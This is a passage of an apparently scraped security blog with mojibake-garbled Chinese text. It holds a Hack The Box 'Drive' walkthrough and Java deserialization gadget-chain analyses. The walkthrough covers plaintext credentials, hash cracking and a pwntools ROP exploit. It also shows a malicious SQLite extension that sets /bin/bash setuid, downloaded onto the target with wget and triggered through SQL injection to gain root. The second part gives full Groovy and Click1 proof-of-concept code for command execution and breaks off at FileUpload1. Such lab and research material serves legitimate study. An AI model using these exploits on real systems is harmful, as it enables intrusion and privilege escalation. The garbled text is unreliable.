code before the end of the monthI will reach you soon with the token to apply your changes on the repothanks! sshç™»é™† 12ssh martin@10.10.11.235password:Xk4@KjyrYv8t194L! User_martinbackupsåœ¨/var/www/backupsç›®å½•ä¸‹å‘ç°ä¸€äº›å¤‡ä»½æ–‡ä»¶ï¼Œä¸‹è½½åˆ°æœ¬åœ°ï¼Œå°è¯•å¾—åˆ°æ•æ„Ÿä¿¡æ¯ï¼› 123456789martin@drive:/var/www/backups$ pwd/var/www/backupsmartin@drive:/var/www/backups$ ls -ltotal 3732-rw-r--r-- 1 www-data www-data 13018 Sep 1 20:00 1_Dec_db_backup.sqlite3.7z-rw-r--r-- 1 www-data www-data 12226 Sep 1 20:00 1_Nov_db_backup.sqlite3.7z-rw-r--r-- 1 www-data www-data 12722 Sep 1 20:00 1_Oct_db_backup.sqlite3.7z-rw-r--r-- 1 www-data www-data 12770 Sep 1 20:00 1_Sep_db_backup.sqlite3.7z-rwxr-xr-x 1 root root 3760128 Dec 26 2022 db.sqlite3 ä¸‹è½½åˆ°æœ¬åœ°ä¹‹åï¼Œä¼šå‘ç°è§£å‹éœ€è¦å¯†ç ï¼Œå¹¶ä¸”db.sqlite3ä¸­å¹¶æ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„ä¿¡æ¯ giteaä¸‹ä¸€æ­¥æ˜¯æœç´¢é‡è¦æ–‡ä»¶ï¼Œæœä¸å…¶ç„¶å­˜åœ¨ä¸€ä¸ªgiteaæ–‡ä»¶ï¼ŒGiteaæ˜¯ä¸€ä¸ªåŸºäºGoè¯­è¨€çš„å¼€æºè‡ªåŠ©GitæœåŠ¡ï¼Œç±»ä¼¼äºGitHubæˆ–GitLabã€‚å®ƒæä¾›äº†ä¸€ä¸ªè½»é‡çº§çš„ã€æ˜“äºå®‰è£…å’Œç®¡ç†çš„GitæœåŠ¡ï¼Œå¯ä»¥åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šæ­å»ºç§æœ‰çš„Gitä»“åº“ã€‚ 123456789101112131415martin@drive:/usr/local/bin$ lscygdb cython cythonize django-admin gitea gunicorn pipreqs sqlformatmartin@drive:/usr/local/bin$ ./gitea2023/12/15 07:19:00 cmd/web.go:106:runWeb() [I] Starting Gitea on PID: 6652922023/12/15 07:19:00 .../setting/packages.go:44:newPackages() [E] Unable to create chunked upload directory: /usr/local/bin/data/tmp/package-upload (mkdir /usr/local/bin/data: permission denied)2023/12/15 07:19:00 ...s/install/setting.go:21:PreloadSettings() [I] AppPath: /usr/local/bin/gitea2023/12/15 07:19:00 ...s/install/setting.go:22:PreloadSettings() [I] AppWorkPath: /usr/local/bin2023/12/15 07:19:00 ...s/install/setting.go:23:PreloadSettings() [I] Custom path: /usr/local/bin/custom2023/12/15 07:19:00 ...s/install/setting.go:24:PreloadSettings() [I] Log path: /usr/local/bin/log2023/12/15 07:19:00 ...s/install/setting.go:25:PreloadSettings() [I] Configuration file: /usr/local/bin/custom/conf/app.ini2023/12/15 07:19:00 ...s/install/setting.go:26:PreloadSettings() [I] Prepare to run install page2023/12/15 07:19:01 ...s/install/setting.go:29:PreloadSettings() [I] SQLite3 is supported2023/12/15 07:19:02 cmd/web.go:217:listen() [I] [657bfde6] Listen: http://0.0.0.0:30002023/12/15 07:19:02 cmd/web.go:221:listen() [I] [657bfde6] AppURL(ROOT_URL): http://localhost:3000/2023/12/15 07:19:02 ...s/graceful/server.go:61:NewServer() [I] [657bfde6] Starting new Web server: tcp:0.0.0.0:3000 å¹¶ä¸”giteaç›‘å¬3000ç«¯å£ï¼›æˆ‘ä»¬å°è¯•ç«¯å£è½¬å‘åˆ°æœ¬åœ°ï¼Œä½¿å¾—æœ¬åœ°å¯ä»¥è®¿é—®ï¼› æ‰§è¡Œè¿™æ¡å‘½ä»¤åï¼Œå½“ä½ è®¿é—®localhost:3000æ—¶ï¼Œå®é™…ä¸Šä¼šå»ºç«‹ä¸€ä¸ªSSHéš§é“ï¼Œå°†æµé‡ä»ä½ çš„æœ¬åœ°ä¸»æœºçš„3000ç«¯å£è½¬å‘åˆ°drive.htbä¸»æœºçš„3000ç«¯å£ã€‚è¿™æ„å‘³ç€ä»»ä½•å‘é€åˆ°localhost:3000çš„æµé‡éƒ½ä¼šé€šè¿‡SSHè¿æ¥è¢«è½¬å‘åˆ°drive.htbä¸»æœºä¸Šè¿è¡Œçš„æœåŠ¡ã€‚ å› æ­¤ï¼Œå¦‚æœdrive.htbä¸»æœºä¸Šç¡®å®æœ‰ä¸€ä¸ªæœåŠ¡åœ¨3000ç«¯å£ä¸Šè¿è¡Œï¼Œå¹¶ä¸”SSHè¿æ¥ä¹Ÿå·²ç»å»ºç«‹ï¼Œé‚£ä¹ˆå½“ä½ è®¿é—®localhost:3000æ—¶ï¼Œä½ åº”è¯¥èƒ½å¤Ÿè®¿é—®åˆ°drive.htbä¸»æœºä¸Šå¯¹åº”çš„æœåŠ¡ã€‚è¿™ç§æ–¹å¼å¯ä»¥è®©ä½ é€šè¿‡SSHè¿æ¥æ¥è®¿é—®è¿œç¨‹ä¸»æœºä¸Šçš„æœåŠ¡ï¼Œè€Œä¸éœ€è¦ç›´æ¥æš´éœ²è¿™äº›æœåŠ¡åœ¨å…¬å…±ç½‘ç»œä¸Šã€‚ 12ssh martin@10.10.11.235 -L 3000:drive.htb:3000password:Xk4@KjyrYv8t194L! email:martin@drive.htbï¼›password:Xk4@KjyrYv8t194L!æˆåŠŸç™»é™†ï¼›åªæœ‰ä¸€ä¸ªä»“åº“ï¼Œåœ¨DoodleGrive/db_backup.shä¸‹æœé›†åˆ°åˆ°äº†è§£å‹æ–‡ä»¶çš„å¯†ç ï¼šH@ckThisP@ssW0rDIfY0uC@n:) 12345678910111213#!/bin/bashDB=$1date_str=$(date +'%d_%b')7z a -p'H@ckThisP@ssW0rDIfY0uC@n:)' /var/www/backups/${date_str}_db_backup.sqlite3.7z db.sqlite3cd /var/www/backups/ls -l --sort=t *.7z &gt; backups_num.tmpbackups_num=$(cat backups_num.tmp | wc -l)if [[ $backups_num -gt 10 ]]; then #backups is more than 10... deleting to oldest backup rm $(ls *.7z --sort=t --color=never | tail -1) #oldest backup deleted successfully!firm backups_num.tmp è§£å‹æ–‡ä»¶7zè§£å‹ 1237z x 1_Nov_db_backup.sqlite3.7z -oname_Nov7z x 1_Oct_db_backup.sqlite3.7z -oname_Oct...... hashcatç ´è§£å¯†ç ï¼Œå¯†ç ä¸æ­¢ä¸€ä¸ªï¼Œæšä¸¾å°è¯•å¾—åˆ°äº†æ­£ç¡®passwd:johnmayer7 1234567hashcat -m 124 -a 0 --force -O tests /usr/share/wordlists/rockyou.txthashcat tests --show sha1$Ri2bP6RVoZD5XYGzeYWr7c$71eb1093e10d8f7f4d1eb64fa604e6050f8ad141:johniscoolsha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004:john316sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7sha1$DhWa3Bym5bj9Ig73wYZRls$3ecc0c96b090dea7dfa0684b9a1521349170fc93:john boy User_tom12ssh tom@10.10.11.235passwd:johnmayer7 ä»£ç åˆ†æ12find / -perm -4000 2&gt;/dev/null/home/tom/doodleGrive-cli å°†æ–‡ä»¶ä¸‹è½½åˆ°æœ¬åœ°æŸ¥çœ‹ï¼› mainå‡½æ•°å­˜åœ¨æ ¼å¼å­—ç¬¦ä¸²æ¼æ´+æ ˆæº¢å‡º 1234567891011121314151617181920212223242526272829303132333435363738int __cdecl main(int argc, const char **argv, const char **envp){ int v3; // edx int v4; // ecx int v5; // r8d int v6; // r9d int v7; // edx int v8; // ecx int v9; // r8d int v10; // r9d char v12[16]; // [rsp+0h] [rbp-50h] BYREF char v13[56]; // [rsp+10h] [rbp-40h] BYREF unsigned __int64 v14; // [rsp+48h] [rbp-8h] v14 = __readfsqword(0x28u); setenv(&quot;PATH&quot;, &amp;unk_4973A8, 1LL); setuid(0LL); setgid(0LL); puts(&quot;[!]Caution this tool still in the development phase...please report any issue to the development team[!]&quot;); puts(&quot;Enter Username:&quot;); fgets(v12, 16LL, stdin); sanitize_string(v12); printf(&quot;Enter password for &quot;, 16, v3, v4, v5, v6, v12[0]); printf(v12, 16, v7, v8, v9, v10, v12[0]); puts(&quot;:&quot;); fgets(v13, 400LL, stdin); sanitize_string(v13); if ( j_strcmp_ifunc(v12, &quot;moriarty&quot;) || j_strcmp_ifunc(v13, &quot;findMeIfY0uC@nMr.Holmz!&quot;) ) { puts(&quot;Invalid username or password.&quot;); } else { puts(&quot;Welcome...!&quot;); main_menu(); } return 0;} main_menu()å‡½æ•°æ˜¯ä¸€äº›æ‰§è¡Œsqlite3çš„ä¸€äº›åŠŸèƒ½ 123456789101112131415161718192021222324 switch ( v6[0] ) { case '1': show_users_list(); break; case '2': show_groups_list(); break; case '3': show_server_status(); break; case '4': show_server_log(); break; case '5': activate_user_account(); break; case '6': puts(&quot;exiting...&quot;); exit(0LL); default: puts(&quot;please Select a valid option...&quot;); break;} å…¶ä¸­activate_user_accountå‡½æ•°å­˜åœ¨sqlæ³¨å…¥ 12345678910111213141516171819202122printf(&quot;Enter username to activate account: &quot;, a2, a3, a4, a5, a6, v13[0]);fgets(v13, 40LL, stdin);v13[j_strcspn_ifunc(v13, &quot;\\n&quot;)] = 0;if ( v13[0] ){ sanitize_string(v13); snprintf( v14, 250, &quot;/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line 'UPDATE accounts_customuser SET is_active=1 WHERE username=\\&quot;%s\\&quot;;'&quot;, v13, v6, v7, v13[0]); printf(&quot;Activating account for user '%s'...\\n&quot;, v13, v8, v9, v10, v11, v13[0]); system(v14);}else{ puts(&quot;Error: Username cannot be empty.&quot;);} ææƒæ–¹æ³•ä¸€(bof+printf)å°è¯•åˆ©ç”¨äºŒè¿›åˆ¶æ–‡ä»¶æ¼æ´ææƒ; è¿™é“é¢˜æˆ‘è‡ªå·±å†™äº†ä¸ªexpï¼Œæœ¬åœ°å¯ä»¥æˆåŠŸï¼Œæˆ‘æƒ³å»é¶åœºæœºå¯¹å¤–å¼€ä¸€ä¸ªç«¯å£æœåŠ¡ï¼Œä½¿æˆ‘æ”»å‡»æœºå¯ä»¥ncåˆ°é¶åœºæœºè¿è¡Œè¿™ä¸ªæœ‰æ¼æ´çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘å‘ç°è¿™ä¸ªäºŒè¿›åˆ¶æ–‡ä»¶æ²¡æœ‰åˆ·æ–°ç¼“å†²åŒºåŸå› ç­‰ï¼Œå¯¼è‡´è¿™ç§åŠæ³•ç”¨ä¸äº†ï¼›æˆ‘ç›´æ¥æŠŠæˆ‘çš„expæ”¾åˆ°é¶æœºä¸Šï¼Œæœ‰ç¼ºå°‘ä¸€äº›pythonçš„åº“ï¼›æœ€ç»ˆåˆ©ç”¨pythonçš„sshæŠ€æœ¯å¾—åˆ°è¿œç¨‹æœºçš„ä¸€ä¸ªè¿›ç¨‹ææƒæˆåŠŸ 12345678910111213141516171819202122232425262728293031323334353637383940from pwn import *context(os='linux',arch='amd64',log_level='debug')filename = &quot;doodleGrive-cli&quot;#p = process(filename)elf = ELF(filename)ssh_host = 'drive.htb'ssh_user = 'tom'ssh_pass = 'johnmayer7'ssh_port = 22sh = ssh(host=ssh_host, user=ssh_user, password=ssh_pass, port=ssh_port)p = sh.run('./doodleGrive-cli')pop_rax = 0x0000000000453e37pop_rdi = 0x0000000000401912pop_rsi = 0x000000000040f74epop_rdx = 0x000000000040181fret = 0x000000000040101asyscall = 0x00000000004012d3binsh = 0x497CD5#Canary ==&gt; %15$pp.sendlineafter(&quot;Enter Username:\\n&quot;,b&quot;%15$p&quot;)p.recvuntil('Enter password for ')Canary = int(p.recv(18),16)print(hex(Canary))payload = b&quot;a&quot;*0x38+p64(Canary)+b&quot;deadbeef&quot;+p64(pop_rax)+p64(0x3b)+p64(pop_rdi)+p64(binsh)+p64(pop_rsi)+p64(0)+p64(pop_rdx)+p64(0)+p64(syscall)p.sendlineafter(&quot;:\\n&quot;,payload)p.interactive() æ–¹æ³•äºŒ(load_extension)ä¸€å¼€å§‹æˆ‘æƒ³å°è¯•åˆ©ç”¨æ–‡ä»¶è¯»å–å‡½æ•°æ¥å¾—åˆ°/root/root.txt,é—æ†¾çš„æ˜¯æˆ‘å¹¶æ²¡æœ‰æœç´¢åˆ°sqllie3çš„æ–‡ä»¶è¯»å–å‡½æ•°çš„æœ‰å…³ä¿¡æ¯ï¼› åˆ©ç”¨SQLite3ä¸­çš„load_extensionå‡½æ•°ã€‚ä½ å¯ä»¥åœ¨è¿™é‡ŒæŸ¥çœ‹æ›´å¤šå…³äºå®ƒçš„ä¿¡æ¯ï¼šSQLite3 load_extensionã€‚ ç»è¿‡å¹¿æ³›çš„æµ‹è¯•åï¼Œæˆ‘ä»¬æ³¨æ„åˆ°åº”ç”¨ç¨‹åºè¿‡æ»¤æ‰äº†å­—ç¬¦â€œ â€ã€‚å’Œâ€œ/â€ï¼Œæœ€å¤§è¾“å…¥é•¿åº¦ä¸º40ä¸ªå­—ç¬¦ã€‚ä¸ºäº†ç»•è¿‡ç¬¬ä¸€ä¸ªé™åˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨char()å‡½æ•°å°†æ–‡æœ¬å†™æˆASCIIã€‚å¯¹äºç¬¬äºŒä¸ªé™åˆ¶ï¼Œæˆ‘ä»¬éœ€è¦å°†æ–‡ä»¶å‹ç¼©åˆ°åªæœ‰ä¸€ä¸ªå­—ç¬¦ä»¥èŠ‚çœç©ºé—´ åˆ›å»ºä¸€ä¸ªæ¶æ„æ–‡ä»¶a.c;è®°ä½ï¼Œæ–‡ä»¶ååº”è¯¥åªåŒ…å«ä¸€ä¸ªå­—ç¬¦ï¼Œåˆå§‹åŒ–å‡½æ•°åº”è¯¥éµå¾ªä»¥ä¸‹æ ¼å¼ï¼šsqlite3_&lt;filename&gt;_init()(ä¹Ÿå°±æ˜¯filenameè¦ä¸load_extensionå‡½æ•°ä¸­çš„æ–‡ä»¶åè¦ä¸€è‡´æ‰è¡Œ)ã€‚ 1234567#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void sqlite3_a_init() {setuid(0);setgid(0);system(&quot;/usr/bin/chmod +s /bin/bash&quot;);} ç¼–è¯‘ä»£ç  1gcc -shared a.c -o a.so -nostartfiles -fPIC å¼€å¯pythonæœåŠ¡ 1python3 -m http.server åœ¨é¶æœºä¸‹è½½æ¶æ„æ–‡ä»¶å¹¶å®æ—¶æ”»å‡»å¾—åˆ°root 123456789101112131415161718192021222324252627tom@drive:~$ wget 10.10.16.13:8000/a.sotom@drive:~$ mv a.so atom@drive:~$ ./doodleGrive-cli [!]Caution this tool still in the development phase...please report any issue to the development team[!]Enter Username:moriartyEnter password for moriarty:findMeIfY0uC@nMr.Holmz!Welcome...!doodleGrive cli beta-2.2: 1. Show users list and info2. Show groups list3. Check server health and status4. Show server requests log (last 1000 request)5. activate user account6. ExitSelect option: 5 Enter username to activate account: &quot;+load_extension(char(46,47,97))--+Activating account for user '&quot;+load_extension(char(46,47,97))--+'...tom@drive:~$ ls -l /bin/bash-rwsr-sr-x 1 root root 1183448 Apr 18 2022 /bin/bashtom@drive:~$ bash -pbash-5.0# whoamiroot","link":"/2023/12/15/Drive(HTB)/"},{"title":"Groovy+Click1+FileUpload1","text":"Groovyä¾èµ– 123456 &lt;!-- Groovy : 1.7.0-2.4.3 --&gt; &lt;dependency&gt; &lt;groupId&gt;org.codehaus.groovy&lt;/groupId&gt; &lt;artifactId&gt;groovy&lt;/artifactId&gt; &lt;version&gt;2.4.3&lt;/version&gt; &lt;/dependency&gt; MethodClosureä¸­æœ‰ä¸€ä¸ª doCall æ–¹æ³•ï¼Œè°ƒç”¨ InvokerHelper.invokeMethod() æ–¹æ³•è¿›è¡Œæ–¹æ³•è°ƒç”¨ã€‚ 123456789101112131415161718192021222324252627public MethodClosure(Object owner, String method) { super(owner); this.method = method; final Class clazz = owner.getClass()==Class.class?(Class) owner:owner.getClass(); maximumNumberOfParameters = 0; parameterTypes = EMPTY_CLASS_ARRAY; List&lt;MetaMethod&gt; methods = InvokerHelper.getMetaClass(clazz).respondsTo(owner, method); for(MetaMethod m : methods) { if (m.getParameterTypes().length &gt; maximumNumberOfParameters) { Class[] pt = m.getNativeParameterTypes(); maximumNumberOfParameters = pt.length; parameterTypes = pt; } }}public String getMethod() { return method;}protected Object doCall(Object arguments) { return InvokerHelper.invokeMethod(getOwner(), method, arguments);} é‚£ä¹ˆè¿™æ ·å°±å¯ä»¥æ‰§è¡Œå‘½ä»¤; 1234MethodClosure mc = new MethodClosure(Runtime.getRuntime(), &quot;exec&quot;);Method m = MethodClosure.class.getDeclaredMethod(&quot;doCall&quot;, Object.class);m.setAccessible(true);m.invoke(mc, &quot;calc&quot;); ProcessGroovyMethods.execute()æ–¹æ³• 123public static Process execute(final String self) throws IOException { return Runtime.getRuntime().exec(self);} String.execute() æ–¹æ³• Groovy ä¸º String ç±»å‹æ·»åŠ äº† execute() æ–¹æ³•ï¼Œä»¥ä¾¿æ‰§è¡Œ shell å‘½ä»¤ï¼Œè¿™ä¸ªæ–¹æ³•ä¼šè¿”å›ä¸€ä¸ª Process å¯¹è±¡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ Groovy ä¸­ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨ &quot;ls&quot;.execute() è¿™ç§æ–¹æ³•æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ â€œlsâ€ã€‚ åœ¨ Java ä¸­ï¼Œå°±å¯ä»¥ç›´æ¥å†™åšï¼šå°±æ˜¯æ—¶è°ƒç”¨â€calcâ€å­—ç¬¦ä¸²çš„executeå‡½æ•°ï¼›æœ€ç»ˆæ‰§è¡Œcalcå‘½ä»¤ 12MethodClosure methodClosure = new MethodClosure(&quot;calc&quot;, &quot;execute&quot;);methodClosure.call(); doCallæ–¹æ³•ç”±protectedä¿®é¥°ï¼Œæ‰€ä»¥è°ƒç”¨callæ–¹æ³•;MethodClosureæ˜¯æ²¡æœ‰callæ–¹æ³•çš„ï¼Œæœ€ç»ˆè°ƒç”¨å…¶çˆ¶ç±»Closure.call()ï¼› ä½†æ˜¯çœ‹ä»£ç å¾—çŸ¥ï¼Œæœ€ç»ˆè¿˜æ˜¯è°ƒå›åˆ°MethodClosure.doCall(args) 12345678910public V call(Object... args) { try { return (V) getMetaClass().invokeMethod(this,&quot;doCall&quot;,args); } catch (InvokerInvocationException e) { ExceptionUtils.sneakyThrow(e.getCause()); return null; // unreachable statement } catch (Exception e) { return (V) throwRuntimeException(e); }} ConvertedClosureçš„çˆ¶ç±»æ˜¯ConversionHandlerï¼› ConversionHandlerè¿™ä¸ªç±»å®ç°äº†InvocationHandleræ¥å£ï¼›æ€è·¯æ˜¯è¿™æ ·çš„ï¼Œä¸ºConvertedClosureç±»æä¸€ä¸ªä»£ç†ï¼›å½“è°ƒç”¨æ–¹æ³•æ—¶å°±ä¼šæ‰§è¡Œåˆ°ConversionHandler.invoke();ConversionHandler.invoke()è°ƒç”¨äº†invokeCustomæ–¹æ³• 123456789101112131415public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { VMPlugin plugin = VMPluginFactory.getPlugin(); if (plugin.getVersion()&gt;=7 &amp;&amp; isDefaultMethod(method)) { Object handle = handleCache.get(method); if (handle == null) { handle = plugin.getInvokeSpecialHandle(method, proxy); handleCache.put(method, handle); } return plugin.invokeHandle(handle, args); } if (!checkMethod(method)) { try { return invokeCustom(proxy, method, args); // &lt;&lt;== ...... ConvertedClosure.invokeCustomæ–¹æ³•ä¸­ï¼Œå¦‚æœè¦ä»£ç†çš„å‡½æ•°åå’ŒString methodç›¸åŒï¼Œå°±ä¼šè°ƒç”¨call; è€Œ((Closure) getDelegate())å…¶å®å°±æ˜¯å¾—åˆ°ConvertedClosureæ„é€ å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œå¾ˆæ˜æ˜¾ï¼›è¿™äº›å€¼éƒ½æ˜¯å¯æ§çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å»è°ƒç”¨ä¸€ä¸ªMethodClosureçš„callå‡½æ•°ï¼Œä»è€Œå¯¼è‡´å‘½ä»¤æ‰§è¡Œï¼› 12345678910 public ConvertedClosure(Closure closure, String method) { super(closure); this.methodName = method; }public Object invokeCustom(Object proxy, Method method, Object[] args) throws Throwable { if (methodName!=null &amp;&amp; !methodName.equals(method.getName())) return null; return ((Closure) getDelegate()).call(args); } Poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960package groovy;import org.codehaus.groovy.runtime.ConversionHandler;import org.codehaus.groovy.runtime.ConvertedClosure;import org.codehaus.groovy.runtime.MethodClosure;import org.codehaus.groovy.runtime.ProcessGroovyMethods;import java.io.*;import java.lang.annotation.Target;import java.lang.reflect.*;import java.util.Comparator;import java.util.Map;import java.util.PriorityQueue;public class Test1 { public static void main(String[] args) throws Exception { MethodClosure methodClosure = new MethodClosure(&quot;calc&quot;, &quot;execute&quot;); //ç¬¬äºŒä¸ªå‚æ•°ä¸º&quot;entrySet&quot;æ˜¯ä¸ºäº†ä½¿invokeCustomçš„ifä¸ºtrue ConvertedClosure closure = new ConvertedClosure(methodClosure, &quot;entrySet&quot;); Class&lt;?&gt; c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; constructor = c.getDeclaredConstructor(Class.class, Map.class); constructor.setAccessible(true); Map handler = (Map) Proxy.newProxyInstance(ConvertedClosure.class.getClassLoader(), new Class[]{Map.class}, closure); InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, handler); serialize(invocationHandler); unserialize(); //å…¥å£é“¾ç”¨&quot;PriorityQueue&quot;ä¹Ÿæ˜¯å¯ä»¥çš„ï¼Œå¦‚æœè¦ç”¨è®°,å¾—æ”¹ç¬¬äºŒä¸ªå‚æ•°ä¸º&quot;compares&quot;,å¦åˆ™invokeCustomçš„ifè¿‡ä¸å»// Comparator&lt;Object&gt; comparator = (Comparator&lt;Object&gt;) Proxy.newProxyInstance(// Comparator.class.getClassLoader(), new Class&lt;?&gt;[]{Comparator.class}, closure);//// PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(comparator); //åªèƒ½é€šè¿‡åå°„å°†sizeçš„å€¼æ”¹ä¸º2;è¦ä½¿å¾—å‚æ•°ä¸ºç©º;ä¸èƒ½åƒä¹‹å‰ä¸€æ ·addä¸¤ä¸ªæ•°æ®ï¼Œå¦åˆ™æœ€ç»ˆä¼šæ‰§è¡Œ&quot;calc&quot;.execute(æ•°æ®1,æ•°æ®2)==&gt;æŠ¥é”™ï¼Œ// Field size = queue.getClass().getDeclaredField(&quot;size&quot;);// size.setAccessible(true);// size.set(queue,2);// serialize(queue);// unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} gadget: 123456AnnotationInvocationHandler.readObject() Map.entrySet() (Proxy) ConversionHandler.invoke() ConvertedClosure.invokeCustom() MethodClosure.call() ProcessGroovyMethods.execute() æˆ–è€…(å°±æ˜¯å…¥å£é“¾ä¸ä¸€æ ·) 123456PriorityQueue.readObject() comparator.compare() (Proxy) ConversionHandler.invoke() ConvertedClosure.invokeCustom() MethodClosure.call() ProcessGroovyMethods.execute() Click1ä¾èµ– 1234567891011&lt;dependency&gt; &lt;groupId&gt;org.apache.click&lt;/groupId&gt; &lt;artifactId&gt;click-nodeps&lt;/artifactId&gt; &lt;version&gt;2.3.0&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;artifactId&gt;javax.servlet-api&lt;/artifactId&gt; &lt;version&gt;3.1.0&lt;/version&gt;&lt;/dependency&gt; Columnç±»çš„å†…éƒ¨ç±»:ColumnComparatorç±»è°ƒç”¨äº†compareæ–¹æ³• this.columnæ˜¯å¯æ§çš„ï¼›ä½¿ä»–è°ƒç”¨åˆ°Column.getProperty(); ç„¶åä¼šè°ƒç”¨åˆ°PropertyUtils.getValue; getObjectPropertyValueæ–¹æ³•ï¼šâ€sourceâ€å½¢å‚å’Œâ€nameâ€å½¢å‚éƒ½æ˜¯å¯æ§çš„ï¼›å¦‚æœä½¿å¾—â€sourceâ€å½¢å‚ä¸ºæ¶æ„çš„TemplatesImplå¯¹è±¡ï¼Œâ€nameâ€ä¸ºoutputPropertiesï¼›æœ€åmethod.invoke(source);å°±ä¼šè°ƒç”¨TemplatesImpl.getoutputPropertiesï¼›è¿™å°±å’ŒCBé“¾å¾ˆåƒï¼› 123456789101112private static Object getObjectPropertyValue(Object source, String name, Map cache) { CacheKey methodNameKey = new CacheKey(source, name); Method method = null; try { method = (Method)cache.get(methodNameKey); if (method == null) { method = source.getClass().getMethod(ClickUtils.toGetterName(name)); //&lt;&lt;=== cache.put(methodNameKey, method); } return method.invoke(source); //&lt;&lt;=== 1234567public static String toGetterName(String property) { HtmlStringBuffer buffer = new HtmlStringBuffer(property.length() + 3); buffer.append(&quot;get&quot;); buffer.append(Character.toUpperCase(property.charAt(0))); buffer.append(property.substring(1)); return buffer.toString();} gadget 123456PriorityQueue.readObject() Column$ColumnComparator.compare() Column.getProperty() PropertyUtils.getValue() PropertyUtils.getObjectPropertyValue() TemplatesImpl.getOutputProperties() Poc 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081package click;import java.io.*;import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;import javassist.ClassPool;import javassist.CtClass;import org.apache.click.control.Column;import org.apache.click.control.Table;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.util.Comparator;import java.util.PriorityQueue;public class Test1 { public static void main(String[] args) throws Exception { String cmd = &quot;calc&quot;; //TemplateImpl åŠ¨æ€åŠ è½½å­—èŠ‚ç  String AbstractTranslet=&quot;com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet&quot;; ClassPool classPool=ClassPool.getDefault(); classPool.appendClassPath(AbstractTranslet); CtClass payload=classPool.makeClass(&quot;a&quot;); payload.setSuperclass(classPool.get(AbstractTranslet)); payload.makeClassInitializer().setBody(&quot;Runtime.getRuntime().exec(\\&quot;&quot;+cmd+&quot;\\&quot;);&quot;); byte[] code=payload.toBytecode(); TemplatesImpl templates = new TemplatesImpl(); Class templatesClass = templates.getClass(); Field name = templatesClass.getDeclaredField(&quot;_name&quot;); name.setAccessible(true); name.set(templates,&quot;zIxyd&quot;); byte[][] bytes= {code}; Field bytecodes = templatesClass.getDeclaredField(&quot;_bytecodes&quot;); bytecodes.setAccessible(true); bytecodes.set(templates,bytes); Field tfactory = templatesClass.getDeclaredField(&quot;_tfactory&quot;); tfactory.setAccessible(true); tfactory.set(templates,new TransformerFactoryImpl()); Column column = new Column(&quot;outputProperties&quot;); //é˜²æ­¢ç©ºæŒ‡é’ˆå¼‚å¸¸ column.setTable(new Table()); Class clazz = Class.forName(&quot;org.apache.click.control.Column$ColumnComparator&quot;); Constructor declaredConstructor = clazz.getDeclaredConstructor(Column.class); declaredConstructor.setAccessible(true); Comparator comparator = (Comparator)declaredConstructor.newInstance(column); //å…ˆå¡«åƒåœ¾æ•°æ®ï¼Œé˜²æ­¢ååºåˆ—åŒ–æ—¶å°±è°ƒç”¨ï¼Œåé¢åœ¨é€šè¿‡åå°„æ”¹å›æ¥ PriorityQueue&lt;Object&gt; priorityQueue = new PriorityQueue&lt;&gt;(1); priorityQueue.add(1); priorityQueue.add(2); //é€šè¿‡åå°„å°†åƒåœ¾æ•°æ®æ”¹æˆæ¶æ„æ•°æ® Field field = PriorityQueue.class.getDeclaredField(&quot;queue&quot;); field.setAccessible(true); Object[] objects = (Object[]) field.get(priorityQueue); objects[0] = templates; Field comparatorField = priorityQueue.getClass().getDeclaredField(&quot;comparator&quot;); comparatorField.setAccessible(true); comparatorField.set(priorityQueue,comparator); serialize(priorityQueue); unserialize(); } public static void serialize(Object obj) throws IOException { ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(obj); } public static void unserialize() throws IOException, ClassNotFoundException { ObjectInputStream ois = new ObjectInputStream(new FileInputStream(&quot;ser.bin&quot;)); ois.readObject(); }} FileUpload1ä¾èµ– 123456789101112 &lt;!-- commons-fileupload : 1.3.x --&gt;&lt;dependency&gt; &lt;groupId&gt;commons-fileupload&lt;/groupId&gt; &lt;artifactId&gt;commons-fileupload&lt;/artifactId&gt; &lt;version&gt;1.3&lt;/version&gt; &lt;/dependency&gt; &lt;dependency&gt; &lt;groupId&gt;commons-io&lt;/groupId&gt; &lt;artifactId&gt;commons-io&lt;/artifactId&gt; &lt;version&gt;2.4&lt;/version&gt; &lt;/dependency&gt; FileUpload ç»„ä»¶æ˜¯ Apache æä¾›çš„ä¸Šä¼ ç»„ä»¶ï¼Œå®ƒæœ¬èº«ä¾èµ–äº commons-io ç»„ä»¶ï¼Œysoserial 